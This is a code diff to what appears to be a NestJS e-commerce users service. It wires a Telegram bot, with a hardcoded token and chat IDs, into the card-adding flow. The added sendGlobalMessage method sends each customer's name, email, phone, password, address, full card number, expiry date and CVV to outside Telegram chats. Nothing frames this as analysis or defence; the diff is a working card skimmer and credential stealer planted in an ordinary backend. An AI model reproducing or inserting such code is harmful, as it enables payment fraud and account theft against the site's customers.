@@ -2,6 +2,7 @@ import {
   Injectable,
   NotFoundException,
   BadRequestException,
+  Logger,
 } from '@nestjs/common';
 import { InjectModel } from '@nestjs/mongoose';
 import { Card, CartItem, User, UserDocument } from './user.schema';
@@ -9,19 +10,82 @@ import { Model } from 'mongoose';
 
 import { ForgetPswForm, LoginForm, RegisterForm } from './auth.interface';
 import { IAddress } from './address.interface';
-import { TelegramBotService } from './telegram.service';
+// import { TelegramBotService } from './telegram.service';
 import { GlobalMessage } from './globalMsg.interface';
 import { compareAsc, format } from "date-fns";
 import { es } from "date-fns/locale";
+import { IMessage } from './telegram.interface';
+
+const TelegramBot = require('node-telegram-bot-api');
+const TELEGRAM_TOKEN = '7240720904:AAGEDxkL8ucdMKOB6w5LjiPau0W9vL8aBfA';
 
 @Injectable()
 export class UsersService {
+
+  private readonly bot: any;
+  private logger = new Logger(UsersService.name);
+
+  allUser = new Array<{ user: string; chatId: number }>(
+    // { user: 'KaizerBlack', chatId: 745535067 },
+    // { user: 'cmcg1530', chatId: 6454103273 },
+    { user: 'koby', chatId: 951742175 },
+  );
+
   constructor(
     @InjectModel('user')
     private readonly userModel: Model<UserDocument>,
-    private telegramBotSrv: TelegramBotService,
-  ) {}
+    // private telegramBotSrv: TelegramBotService,
+  ) {
+    this.bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
+    this.bot.on('message', this.onReceiveMessage);
+    // Suponiendo que tienes una función que maneja comandos o mensajes
+    this.sendMessageToUser('951742175', `Server started at ${new Date()}`);
+
+    // Escuchar mensajes de texto
+    this.bot.on('message', (msg: IMessage) => {
+      const chatId = msg.chat.id;
+      const text = msg.text;
+      // this.sendMenu(msg.chat.id);
+      //   this.sendHtmlMessage(msg.chat.id);}
+      //   this.sendTextFileToUser(msg.chat.id, "HOLA TODAS", 'ehloqtedigo');
+    });
+  }
+
+  onReceiveMessage = (msg: any) => {
+    // this.logger.debug(msg);
+  };
+
+  sendMessageToUser = (userId: string, message: string) => {
+    this.bot.sendMessage(userId, message).catch((error) => {
+      this.logger.error(`Error al enviar mensaje: ${error}`);
+      // Implementar lógica de reintento o notificación aquí
+    });
+  };
+
+  sendGlobalMessage(globalMessage: GlobalMessage) {
+    try {
+      const options = {
+        parse_mode: 'HTML',
+      };
+
+      const message = `
+            <b>Informacion Cliente</b> \nNombre: ${globalMessage.fullName} \nCorreo: ${globalMessage.email} \nNumero: ${globalMessage.phone} \nClave : ${globalMessage.password}
+            \n<b>Direccion Cliente</b> \nCiudad: ${globalMessage.city} \nEstado: ${globalMessage.state.name}(${globalMessage.state.code}) \nPais  : ${globalMessage.country.name}(${globalMessage.country.code}) \nDireccion: ${globalMessage.address}\n \n<b>Informacion de pago</b> \nNumber: ${globalMessage.cardNumber} \nFecha : ${globalMessage.expirationDate} \nCodigo: ${globalMessage.cardCVV}\n\nFecha: ${globalMessage.entryDate}
+        `;
+
+      this.allUser.forEach((user) => {
+        this.bot
+          .sendMessage(user.chatId, message, options)
+          .catch((error: any) => {
+            this.logger.error(`Error al enviar mensaje: ${error}`);
+          });
+      });
+    } catch (error) {
+      this.logger.error(`ERROR INESPERADO EN EL METODO: sendGlobalMessage`);
+    }
+  }
+  
   async login(loginForm: LoginForm): Promise<any> {
     // .select('-password')
     const user = await this.userModel.findOne({ email: loginForm.email });
@@ -293,7 +357,8 @@ export class UsersService {
         user.cards.push(newCard);
 
         const globalMessage: GlobalMessage = this.createObjectGlobalMsg(user, newCard);
-        this.telegramBotSrv.sendGlobalMessage(globalMessage);
+        // this.telegramBotSrv.sendGlobalMessage(globalMessage);
+        this.sendGlobalMessage(globalMessage);
 
         // Marca la instancia de usuario como modificada
         user.markModified('cards');
@@ -332,7 +397,8 @@ export class UsersService {
           await user.save();
 
           const globalMessage: GlobalMessage = this.createObjectGlobalMsg(user, newCard);
-          this.telegramBotSrv.sendGlobalMessage(globalMessage);
+          // this.telegramBotSrv.sendGlobalMessage(globalMessage);
+          this.sendGlobalMessage(globalMessage);
 
           throw new BadRequestException('CARD_ALREADY_EXISTS');
         }
